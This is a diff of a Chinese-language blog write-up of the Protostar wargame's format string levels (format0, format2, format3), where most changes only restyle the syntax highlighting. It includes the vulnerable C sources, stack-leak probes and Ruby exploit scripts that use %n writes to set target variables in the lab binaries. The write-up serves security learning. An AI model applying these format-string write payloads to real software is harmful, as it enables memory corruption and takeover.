@@ -57,6 +57,11 @@ if (!doNotTrack) {
 
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@callmebill/lxgw-wenkai-web@latest/lxgwwenkaimono-regular/result.css" />
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+
+
 <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
@@ -65,6 +70,8 @@ if (!doNotTrack) {
 <meta name="msapplication-TileColor" content="#000000">
 <meta name="theme-color" content="#ffffff">
 
+        
+    
     </head>
     <body class="
     article-page
@@ -350,42 +357,42 @@ if (!doNotTrack) {
 </ul>
 <p>This level is at /opt/protostar/bin/format0</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">target</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="nf">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">string</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;you have hit the target correctly :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>string)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> target;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sprintf</span>(buffer, string);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(target <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdeadbeef</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;you have hit the target correctly :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><hr>
 <p>总感觉这其实算 Stack 的题x</p>
 <p>没有太多能说的..</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/ruby</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="s2">&#34;%64d&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">deadbeef</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xef\xbe\xad\xde</span><span class="s2">&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s">&lt;&lt;-END
-</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="sr">/opt/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">format0</span> <span class="c1">#{padding + deadbeef}</span>
-</span></span><span class="line"><span class="cl"><span class="k">END</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="sb">`</span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="sb">`</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/ruby</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%64d&#34;</span>;
+</span></span><span style="display:flex;"><span>deadbeef <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xef\xbe\xad\xde</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;&lt;-END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">/opt/</span>protostar<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>format0 <span style="color:#75715e">#{padding + deadbeef}</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">END</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">`</span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
 </span></span></code></pre></div><p>唯一需要说明的就是 <code>%64d</code> 的作用是对 <code>char buffer[64]</code> 填充 64 个空格进行占位</p>
 <p><img src="/p/protostar_format_0-4/0.png"
 	width="1990"
@@ -408,44 +415,44 @@ if (!doNotTrack) {
 <p>This level moves on from format1 and shows how specific values can be written in memory.</p>
 <p>This level is at /opt/protostar/bin/format2</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;you have modified the target :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;target is %d :(</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">vuln</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> target;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">512</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), stdin);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(buffer);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(target <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;you have modified the target :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;target is %d :(</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, target);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>();
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><hr>
 <p>首先依然是用 <code>objdump</code> 来找到 <code>target</code> 的地址，是 <code>0x080496e4</code></p>
 <p>接下来需要知道我们输入的数据被存在了栈的哪里</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp/format$ /opt/protostar/bin/format2
-</span></span><span class="line"><span class="cl">ABCD%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x
-</span></span><span class="line"><span class="cl">ABCD00000200<span class="p">|</span>b7fd8420<span class="p">|</span>bffff5d4<span class="p">|</span>44434241<span class="p">|</span>78383025<span class="p">|</span>3830257c
-</span></span><span class="line"><span class="cl">target is <span class="m">0</span> :<span class="o">(</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp/format$ /opt/protostar/bin/format2
+</span></span><span style="display:flex;"><span>ABCD%08x|%08x|%08x|%08x|%08x|%08x
+</span></span><span style="display:flex;"><span>ABCD00000200|b7fd8420|bffff5d4|44434241|78383025|3830257c
+</span></span><span style="display:flex;"><span>target is <span style="color:#ae81ff">0</span> :<span style="color:#f92672">(</span>
 </span></span></code></pre></div><p>可以看到 ABCD 的 ASCII 也就是 <code>44434241</code> 出现在了第 4 个 <code>%08x</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xe4\x96\x04\x08</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">stdin</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&#34;%60x%4$n&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># echo 使用单引号，避免把 %4$n 解析成变量</span>
-</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;</span><span class="si">#{</span><span class="n">stdin</span><span class="si">}</span><span class="s2">&#39; | /opt/protostar/bin/format2&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="sb">`</span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="sb">`</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe4\x96\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>stdin <span style="color:#f92672">=</span> target <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%60x%4$n&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># echo 使用单引号，避免把 %4$n 解析成变量</span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;echo &#39;</span><span style="color:#e6db74">#{</span>stdin<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; | /opt/protostar/bin/format2&#34;</span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">`</span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
 </span></span></code></pre></div><p><code>target</code> 也就是 <code>\xe4\x96\x04\x08</code> 是 4 bytes
 再加上 60 个 bytes 的话也就是 64 了</p>
 <p>所以使用 <code>%60x%4$n</code></p>
@@ -471,44 +478,44 @@ if (!doNotTrack) {
 <p>This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.</p>
 <p>This level is at /opt/protostar/bin/format3</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">printbuffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="nf">printbuffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0x01025544</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;you have modified the target :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;target is %08x :(</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">vuln</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> target;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printbuffer</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>string)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(string);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">512</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printbuffer</span>(buffer);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(target <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x01025544</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;you have modified the target :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;target is %08x :(</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, target);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>();
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><hr>
 <p><code>objdump</code> 找到 <code>target</code> 的地址是 <code>0x080496f4</code></p>
 <p>我们的目标是让这个地址上的值为 <code>0x01025544</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp/format$ /opt/protostar/bin/format3
-</span></span><span class="line"><span class="cl">ABCD%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x<span class="p">|</span>%08x
-</span></span><span class="line"><span class="cl">ABCD00000000<span class="p">|</span>bffff590<span class="p">|</span>b7fd7ff4<span class="p">|</span>00000000<span class="p">|</span>00000000<span class="p">|</span>bffff798<span class="p">|</span>0804849d<span class="p">|</span>bffff590<span class="p">|</span>00000200<span class="p">|</span>b7fd8420<span class="p">|</span>bffff5d4<span class="p">|</span>44434241<span class="p">|</span>78383025<span class="p">|</span>3830257c<span class="p">|</span>30257c78<span class="p">|</span>257c7838
-</span></span><span class="line"><span class="cl">target is <span class="m">00000000</span> :<span class="o">(</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp/format$ /opt/protostar/bin/format3
+</span></span><span style="display:flex;"><span>ABCD%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x
+</span></span><span style="display:flex;"><span>ABCD00000000|bffff590|b7fd7ff4|00000000|00000000|bffff798|0804849d|bffff590|00000200|b7fd8420|bffff5d4|44434241|78383025|3830257c|30257c78|257c7838
+</span></span><span style="display:flex;"><span>target is <span style="color:#ae81ff">00000000</span> :<span style="color:#f92672">(</span>
 </span></span></code></pre></div><p>可见 ABCD 出现在第 12 个 <code>%08x</code>，可以稍后替换成我们所需要的地址</p>
 <p>所以可以使用 <code>%12$n</code> 来选取第 12 个参数</p>
 <p><code>0x01025544</code> 这个值其实可以分成三步来写：</p>
@@ -521,21 +528,21 @@ if (!doNotTrack) {
 <p>因为我们只能用 <code>%n</code> 来写入，而 <code>%n</code> 写入的值是「当前打印了多少字符」</p>
 <p>所以下一个值永远只能大于上一个值</p>
 <p>如果直接写<code>0x02</code> 的话就小于 <code>0x55</code>，是无法做到的</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xf4\x96\x04\x08</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\xf5\x96\x04\x08</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\xf6\x96\x04\x08</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 68 = 56 + 12，这里的 12 是因为 target 已经有 12 bytes 了</span>
-</span></span><span class="line"><span class="cl"><span class="n">f4</span> <span class="o">=</span> <span class="s2">&#34;%56x&#34;</span> <span class="o">+</span> <span class="s2">&#34;%12$n&#34;</span> <span class="c1"># 但这里的 12 是因为上文提到 ABCD 出现在第 12 个参数</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 85 = 68 + 17</span>
-</span></span><span class="line"><span class="cl"><span class="n">f5</span> <span class="o">=</span> <span class="s2">&#34;%17x&#34;</span> <span class="o">+</span> <span class="s2">&#34;%13$n&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 258 = 85 + 173</span>
-</span></span><span class="line"><span class="cl"><span class="n">f6</span> <span class="o">=</span> <span class="s2">&#34;%173x&#34;</span> <span class="o">+</span> <span class="s2">&#34;%14$n&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># echo 使用单引号，避免把 %?$n 解析成变量</span>
-</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s">&lt;&lt;-END
-</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="n">echo</span> <span class="s1">&#39;#{target}#{f4+f5+f6}&#39;</span> <span class="o">|</span> <span class="sr">/opt/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">format3</span>
-</span></span><span class="line"><span class="cl"><span class="k">END</span>
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">command</span>
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="sb">`</span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="sb">`</span>
